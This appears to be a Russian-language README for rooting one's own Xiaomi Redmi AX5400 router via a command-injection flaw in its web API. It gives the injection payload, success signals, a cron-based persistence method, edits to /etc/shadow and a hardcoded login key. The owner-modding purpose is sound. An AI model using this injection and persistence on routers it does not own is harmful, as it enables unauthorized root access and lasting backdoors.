# Redmi AX5400 (RA74) — root SSH на прошивке 1.0.63

Получение постоянного SSH-доступа к роутеру **Xiaomi Redmi AX5400** (модель RA74)
на актуальной прошивке **1.0.63**, где все старые методы закрыты.

## Метод

Инъекция shell-команд через API `/xqdatacenter/request` (эксплойт **datacenter7**).
Поле `vendor` JSON-payload передаётся в системный вызов без проверки
`hackCheck=3`, блокирующей все остальные API-методы.

```
POST /cgi-bin/luci/;stok=TOKEN/api/xqdatacenter/request
payload={"api":7,"dev":"a","vendor":";КОМАНДА;#","type":"a"}
```

Признак выполнения: ответ `{"code":-104}` (оригинальная datacenter-команда
упала, но наша команда уже выполнилась). Если `{"code":-1}` — инъекции нет.

Эксплойт впервые добавлен в
[xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher)
3 марта 2026 года для устройств серии RP. Протестирован на RA74 fw 1.0.63.

## Требования

- Python 3 (stdlib, без сторонних библиотек)
- `sshpass` — `brew install sshpass` / `apt install sshpass`
- Знать пароль от веб-интерфейса роутера
- Компьютер в локальной сети роутера (192.168.31.x)
- `~/.ssh/id_rsa.pub` (создать: `ssh-keygen -t rsa -b 4096`)

## Использование

### Шаг 1 — проверить, что инъекция работает

```bash
# Отредактируйте ROUTER, PASSWORD, DEVICE_ID в начале файла
python3 verify_dc7.py
```

Ожидаемый вывод:
```
[3] iperf_test_thr ПОСЛЕ инъекции: 77777
[!!!] ИНЪЕКЦИЯ ПОДТВЕРЖДЕНА — команды выполняются!
```

### Шаг 2 — получить root SSH

```bash
# Отредактируйте ROUTER, PASSWORD, DEVICE_ID в начале файла
python3 root_access.py
```

Вывод при успехе:
```
[+] порт 22 открыт
[+] ключ записан
...
✓ SSH ПО КЛЮЧУ РАБОТАЕТ
uid=0(root) gid=0(root)
aarch64
```

### Подключение

```bash
ssh -o HostKeyAlgorithms=ssh-rsa \
    -o PubkeyAcceptedAlgorithms=ssh-rsa \
    root@192.168.31.1

# или по паролю (пароль: root):
sshpass -p root ssh -o HostKeyAlgorithms=ssh-rsa \
    -o PubkeyAcceptedAlgorithms=ssh-rsa root@192.168.31.1
```

## Как устроена персистентность

Прошивка использует нестандартную схему ФС — без overlayfs:

| Путь | ФС | После перезагрузки |
|------|----|--------------------|
| `/` | squashfs | read-only |
| `/root` | squashfs | **read-only** |
| `/etc` | ramfs | сбрасывается |
| `/etc/config/` | ubifs | **сохраняется** |
| `/etc/crontabs/` | ubifs | **сохраняется** |
| `/data` | ubifs | **сохраняется** |

Скрипт сохраняет ключи и скрипт восстановления в `/data/` (ubifs),
регистрирует `@reboot /data/fix_ssh.sh` в crontab.
При каждой загрузке cron монтирует tmpfs на `/root`, восстанавливает
ключи и пароль, перезапускает dropbear.

## Ключевые находки

**Dropbear читает `/etc/dropbear/authorized_keys`**, а не `~/.ssh/authorized_keys`.
Нашли через `strings /usr/sbin/dropbear | grep authorized_keys`.
Именно поэтому стандартная запись ключа в `~/.ssh/` не давала результата.

**Команда `passwd` не устанавливает «root»** через инъекцию — `\n` в строке
`printf 'root\nroot\n'` трансформируется по пути JSON → URL-encode → shell.
Решение: вычислить хеш локально и вписать в `/etc/shadow` через `sed`.

```bash
# Вычислить хеш для своего пароля:
openssl passwd -1 -salt 'mysalt' 'mypassword'
```

## Алгоритм авторизации веб-интерфейса

```
nonce    = "0_<MAC>_<timestamp>_<rand4>"
password = sha1(nonce + sha1(ADMIN_PASSWORD + KEY))
KEY      = "a2ffa5c9be07488bbb04a3a47d3c5f6a"   # вшит в прошивку
```

Токен (`stok`) действует ~2-3 запроса и привязан к IP-адресу.
Необходим новый логин перед каждой командой.

## Железо

```
Model:  Xiaomi Redmi AX5400 (RA74)
SoC:    Qualcomm IPQ5018 (aarch64)
Kernel: Linux XiaoQiang 4.4.60 #0 SMP PREEMPT Mon Jan 30 10:29:26 2023
SSH:    Dropbear v2017.75
```

## Источники

- [xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) —
  `connect6.py`, реализация datacenter7 (добавлена 03.03.2026, автор remittor)
- Dropbear v2017.75 source, `svr-authpubkey.c`
